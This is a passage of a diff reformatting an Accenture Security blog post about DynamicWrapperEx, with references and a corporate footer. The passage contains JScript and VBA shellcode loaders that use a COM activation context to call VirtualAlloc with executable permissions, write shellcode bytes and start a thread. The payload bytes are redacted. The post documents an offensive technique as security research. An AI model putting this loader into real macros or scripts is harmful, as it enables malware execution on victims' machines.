-</span><span class="pun">}</span><span class="pln"> </span><span class="kwd">catch</span><span class="pln"> </span><span class="pun">(</span><span class="pln">e</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
-</span><span class="typ">WScript</span><span class="pun">.</span><span class="typ">Echo</span><span class="pun">(</span><span class="pln">e</span><span class="pun">.</span><span class="pln">message</span><span class="pun">)</span><span class="pln">
-</span><span class="pun">}</span><span class="pln">
-
-</span><span class="com">//-------------------------------------------------------------------------------------------------</span><span class="pln">
-</span><span class="com">// Execute shellcode</span><span class="pln">
-</span><span class="com">//-------------------------------------------------------------------------------------------------</span><span class="pln">
-</span><span class="kwd">var</span><span class="pln"> commit </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00003000</span><span class="pun">;</span><span class="pln">
-</span><span class="kwd">var</span><span class="pln"> guard </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x40</span><span class="pun">;</span><span class="pln"> 
-
-</span><span class="kwd">var</span><span class="pln"> shellcode </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="pln">
-</span><span class="com">// redacted </span><span class="pln">
-</span><span class="pun">];</span><span class="pln">
-</span><span class="kwd">var</span><span class="pln"> lpAddress </span><span class="pun">=</span><span class="pln"> dwx</span><span class="pun">.</span><span class="typ">VirtualAlloc</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> shellcode</span><span class="pun">.</span><span class="pln">length</span><span class="pun">,</span><span class="pln"> commit</span><span class="pun">,</span><span class="pln"> guard</span><span class="pun">);</span><span class="pln">
-</span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">lpAddress </span><span class="pun">==</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
-</span><span class="typ">WScript</span><span class="pun">.</span><span class="typ">Quit</span><span class="pun">();</span><span class="pln">
-</span><span class="pun">}</span><span class="pln">
-
-</span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">var</span><span class="pln"> i </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> i </span><span class="pun">&lt;</span><span class="pln"> shellcode</span><span class="pun">.</span><span class="pln">length</span><span class="pun">;</span><span class="pln"> </span><span class="pun">++</span><span class="pln">i</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">WriteByte</span><span class="pun">(</span><span class="pln">shellcode</span><span class="str">&lt;i&gt;</span><span class="pun">,</span><span class="pln"> lpAddress</span><span class="pun">,</span><span class="pln"> i</span><span class="pun">);</span><span class="pln">
-</span><span class="pun">}</span><span class="pln">
-
-</span><span class="kwd">var</span><span class="pln"> hThread </span><span class="pun">=</span><span class="pln"> dwx</span><span class="pun">.</span><span class="typ">CreateThread</span><span class="pun">(</span><span class="kwd">null</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> lpAddress</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">null</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">);</span><span class="pln">
-</span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">hThread </span><span class="pun">==</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
-</span><span class="typ">WScript</span><span class="pun">.</span><span class="typ">Quit</span><span class="pun">();</span><span class="pln">
-</span><span class="pun">}</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">WaitForSingleObject</span><span class="pun">(</span><span class="pln">hThread</span><span class="pun">,</span><span class="pln"> </span><span class="lit">10000</span><span class="pun">);</span></pre>
-
-    <p>Same example as above but with Visual Basic for Application (VBA).</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="typ">Sub</span><span class="pln"> </span><span class="typ">Activation</span><span class="pun">()</span><span class="pln">
-</span><span class="typ">Dim</span><span class="pln"> manifest </span><span class="typ">As</span><span class="pln"> </span><span class="typ">String</span><span class="pln">
-manifest </span><span class="pun">=</span><span class="pln"> </span><span class="str">"&lt;?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?&gt;&lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;&lt;assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/&gt; &lt;file name=""DynamicWrapperEx.dll""&gt; &lt;comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/&gt;&lt;/file&gt;&lt;/assembly&gt;"</span><span class="pln">
-
-</span><span class="str">' Change TMP Environment variable
-Dim env As Object
-Set env = CreateObject("WScript.Shell")
-env.Environment("Process").Item("TMP") = "&lt;read/writable folder&gt;"
-
-'</span><span class="pln"> </span><span class="typ">Create</span><span class="pln"> </span><span class="typ">ActivationContext</span><span class="pln">
-</span><span class="typ">Dim</span><span class="pln"> dwx </span><span class="typ">As</span><span class="pln"> </span><span class="typ">Object</span><span class="pln">
-</span><span class="typ">Set</span><span class="pln"> dwx </span><span class="pun">=</span><span class="pln"> </span><span class="typ">CreateObject</span><span class="pun">(</span><span class="str">"Microsoft.Windows.ActCtx"</span><span class="pun">)</span><span class="pln">
-dwx</span><span class="pun">.</span><span class="typ">ManifestText</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> manifest
-
-</span><span class="str">' Create Automation server
-Dim server As Object
-Set server = dwx.CreateObject("DynamicWrapperEx")
-
-'</span><span class="pln"> </span><span class="typ">Execute</span><span class="pln"> code </span><span class="pun">....</span><span class="pln">
-server</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pln"> </span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"VirtualAlloc"</span><span class="pln">
-server</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pln"> </span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"CreateThread"</span><span class="pln">
-server</span><span class="pun">.</span><span class="typ">DwRegister</span><span class="pln"> </span><span class="str">"kernel32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"WaitForSingleObject"</span><span class="pln">
-
-</span><span class="typ">Dim</span><span class="pln"> shellcode </span><span class="typ">As</span><span class="pln"> </span><span class="typ">Variant</span><span class="pln">
-shellcode </span><span class="pun">=</span><span class="pln"> </span><span class="typ">Array</span><span class="pun">(</span><span class="pln">
-</span><span class="str">' redacted
-)
-
-Dim lpAddress As LongLong
-lpAddress = server.VirtualAlloc(0, UBound(shellcode), &amp;H1000, &amp;H40)
-
-For index = LBound(shellcode) To UBound(shellcode)
-i = server.WriteByte(CByte(shellcode(index)), CLngLng(lpAddress), CLng(index))
-Next index
-
-hThread = server.CreateThread(0, 0, CLngLng(lpAddress), 0, 0, 0)
-server.WaitForSingleObject hThread, -1
-End Sub</span></pre>
-
-    <h2>References</h2>
-
-    <p>The following of references and resources have been used to design <strong>DynamicWrapperEx</strong> and subsequently write this blog post:</p>
-
+    ' Create ActivationContext
+    Dim dwx As Object
+    Set dwx = CreateObject("Microsoft.Windows.ActCtx")
+    dwx.ManifestText = manifest
+    
+    ' Create Automation server
+    Dim server As Object
+    Set server = dwx.CreateObject("DynamicWrapperEx")
+    
+    ' Execute code ....
+    server.DwRegister "kernel32.dll", "VirtualAlloc"
+    server.DwRegister "kernel32.dll", "CreateThread"
+    server.DwRegister "kernel32.dll", "WaitForSingleObject"
+    
+    Dim shellcode As Variant
+    shellcode = Array(
+        ' redacted
+    )
+        
+    Dim lpAddress As LongLong
+    lpAddress = server.VirtualAlloc(0, UBound(shellcode), &amp;H1000, &amp;H40)
+    
+    For index = LBound(shellcode) To UBound(shellcode)
+        i = server.WriteByte(CByte(shellcode(index)), CLngLng(lpAddress), CLng(index))
+    Next index
+    
+    hThread = server.CreateThread(0, 0, CLngLng(lpAddress), 0, 0, 0)
+    server.WaitForSingleObject hThread, -1
+End Sub</pre>
+<h2>References</h2>
+<p>The following of references and resources have been used to design <strong>DynamicWrapperEx</strong> and subsequently write this blog post:</p>
 <ul>
-<li><a href="https://web.archive.org/web/20210413192038/https://omnicognate.wordpress.com/2009/10/05/winsxs/">Everything you Never Wanted to Know about WinSxS</a></li>
-<li><a href="https://web.archive.org/web/20210413192038/https://medium.com/cybereason/activation-contexts-a-love-story-9666d5b1e03">Activation Contexts — A Love Story</a> by <a href="https://web.archive.org/web/20210413192038/https://twitter.com/PhilipTsukerman">Philip Tsukerman</a></li>
-<li><a href="https://web.archive.org/web/20210413192038/https://www.amazon.com/Inside-Dale-Rogerson-1-Jan-1997-Paperback/dp/B012HU844O">Inside COM</a> by Dale Rogerson - 1997</li>
-<li><a href="https://web.archive.org/web/20210413192038/https://leanpub.com/windows10systemprogrammingpart2">Windows 10 System Programming, Part 2</a> by <a href="https://web.archive.org/web/20210413192038/https://twitter.com/zodiacon">Pavel Yosifovich</a></li>
-<li>COM in Sixty Seconds! by <a href="https://web.archive.org/web/20210413192038/https://twitter.com/tiraniddo">James Forshaw</a></li>
+<li><a href="https://omnicognate.wordpress.com/2009/10/05/winsxs/">Everything you Never Wanted to Know about WinSxS</a></li>
+<li><a href="https://medium.com/cybereason/activation-contexts-a-love-story-9666d5b1e03">Activation Contexts — A Love Story</a> by <a href="https://twitter.com/PhilipTsukerman">Philip Tsukerman</a></li>
+<li><a href="https://www.amazon.com/Inside-Dale-Rogerson-1-Jan-1997-Paperback/dp/B012HU844O">Inside COM</a> by Dale Rogerson - 1997</li>
+<li><a href="https://leanpub.com/windows10systemprogrammingpart2">Windows 10 System Programming, Part 2</a> by <a href="https://twitter.com/zodiacon">Pavel Yosifovich</a></li>
+<li>COM in Sixty Seconds! by <a href="https://twitter.com/tiraniddo">James Forshaw</a></li>
 </ul>
-
-    <h2>Accenture Security</h2>
-
-    <p>Accenture Security is a leading provider of end-to-end cybersecurity services, including advanced cyber defense, applied cybersecurity solutions and managed security operations. We bring security innovation, coupled with global scale and a worldwide delivery capability through our network of Advanced Technology and Intelligent Operations centers. Helped by our team of highly skilled professionals, we enable clients to innovate safely, build cyber resilience and grow with confidence.&nbsp; Follow us <a href="https://web.archive.org/web/20210413192038/https://twitter.com/AccentureSecure">@AccentureSecure</a> on Twitter or visit us at <a href="https://web.archive.org/web/20210413192038/https://www.accenture.com/security">www.accenture.com/security</a> .</p>
-
+<h2>Accenture Security</h2>
+<p>Accenture Security is a leading provider of end-to-end cybersecurity services, including advanced cyber defense, applied cybersecurity solutions and managed security operations. We bring security innovation, coupled with global scale and a worldwide delivery capability through our network of Advanced Technology and Intelligent Operations centers. Helped by our team of highly skilled professionals, we enable clients to innovate safely, build cyber resilience and grow with confidence.  Follow us <a href="https://twitter.com/AccentureSecure">@AccentureSecure</a> on Twitter or visit us at <a href="https://www.accenture.com/security">www.accenture.com/security</a> .</p>
 <p>Accenture, the Accenture logo, and other trademarks, service marks, and designs are registered or unregistered trademarks of Accenture and its subsidiaries in the United States and in foreign countries. All trademarks are properties of their respective owners. All materials are intended for the original recipient only. The reproduction and distribution of this material is forbidden without express written permission from Accenture. The opinions, statements, and assessments in this report are solely those of the individual author(s) and do not constitute legal advice, nor do they necessarily reflect the views of Accenture, its subsidiaries, or affiliates. Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. It is subject to change. Accenture provides the information on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.</p>
-
 <p>Copyright © 2021 Accenture. All rights reserved.</p>
-
-
-
-
-
 </article>
+{% endraw %}
